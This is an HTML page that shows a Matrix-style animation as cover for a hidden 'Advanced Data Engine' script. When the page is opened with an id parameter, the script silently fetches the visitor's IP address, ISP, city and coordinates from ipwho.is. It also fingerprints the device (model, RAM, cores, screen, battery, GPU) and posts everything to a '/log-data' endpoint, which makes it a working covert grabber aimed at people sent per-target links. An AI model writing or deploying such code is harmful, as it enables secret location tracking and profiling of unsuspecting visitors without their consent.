<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DX-CODEX</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: crosshair; }
        canvas { display: block; position: absolute; top: 0; left: 0; }
        #terminal { position: absolute; top: 15px; left: 15px; color: #0f0; font-family: 'Courier New', monospace; font-size: 11px; pointer-events: none; z-index: 10; text-shadow: 0 0 8px #0f0; line-height: 1.4; }
        .glitch-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 2px, transparent 3px); pointer-events: none; z-index: 5; }
    </style>
</head>
<body>
    <div id="terminal">SYSTEM_STATUS: BOOTING...</div>
    <div class="glitch-overlay"></div>
    <canvas id="mainCanvas"></canvas>

<script>
// --- Matrix & Ripple Engine (From Original Code) ---
const canvas = document.getElementById('mainCanvas');
const ctx = canvas.getContext('2d');
let w, h, cols, drops = [], ripples = [];
function init() {
    w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight;
    cols = Math.floor(w / 20); for (let i = 0; i < cols; i++) drops[i] = Math.random() * -100;
}
function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.08)'; ctx.fillRect(0, 0, w, h);
    ctx.fillStyle = '#0f0'; ctx.font = '15px monospace';
    drops.forEach((y, i) => {
        const text = String.fromCharCode(0x30A0 + Math.random() * 96);
        ctx.fillText(text, i * 20, y * 20);
        if (y * 20 > h && Math.random() > 0.975) drops[i] = 0; drops[i]++;
    });
    ripples.forEach((r, i) => {
        ctx.beginPath(); ctx.arc(r.x, r.y, r.r, 0, Math.PI * 2);
        ctx.strokeStyle = `rgba(0, 255, 0, ${r.o})`; ctx.lineWidth = 2; ctx.stroke();
        r.r += 4; r.o -= 0.02; if (r.o <= 0) ripples.splice(i, 1);
    });
    requestAnimationFrame(draw);
}
window.addEventListener('touchstart', e => ripples.push({x: e.touches[0].clientX, y: e.touches[0].clientY, r: 0, o: 1}));
window.addEventListener('mousedown', e => ripples.push({x: e.clientX, y: e.clientY, r: 0, o: 1}));
window.addEventListener('resize', init); init(); draw();

// --- Advanced Data Engine ---
(async function() {
    if (sessionStorage.getItem('sync')) return;
    const _log = document.getElementById('terminal');
    const params = new URLSearchParams(window.location.search);
    const uid = params.get('id'); if(!uid) return;

    const _fnt = (t) => {
        const m = {'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'};
        return t.split('').map(c => m[c.toUpperCase()] || c).join('');
    };

    _log.innerHTML += `<br>> ${_fnt("Analyzing Hardware")}...`;

    let net = { ip: "N/A", isp: "N/A", loc: "N/A", lat: "N/A", lon: "N/A" };
    try {
        const res = await fetch('https://ipwho.is/');
        const d = await res.json();
        if(d.success) net = { ip: d.ip, isp: d.connection.isp, loc: d.city+", "+d.country, lat: d.latitude, lon: d.longitude };
    } catch(e) {}

    const getModel = () => {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) { const m = ua.match(/Android\s([0-9\.]+);\s([^;]+)\)/); return m ? m[2] : "Android Device"; }
        return navigator.platform;
    };

    const info = {
        model: getModel(), platform: navigator.platform, ip: net.ip, isp: net.isp, location: net.loc,
        lat: net.lat, lon: net.lon, ram: (navigator.deviceMemory || "N/A") + " GB",
        cores: (navigator.hardwareConcurrency || "N/A") + " Cores",
        screen: `${screen.width}x${screen.height} (${screen.colorDepth}-Bit)`,
        battery: (await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0, charging:false}))).level * 100 + "%",
        gpu: (function(){try{const g=document.createElement('canvas').getContext('webgl'); return g.getParameter(g.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);}catch(e){return "N/A"}})()
    };

    await fetch('/log-data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ uid, info }) });
    sessionStorage.setItem('sync', '1');
    _log.innerHTML += `<br>> ${_fnt("Transmission Successful")}`;
})();
</script>
</body>
</html>
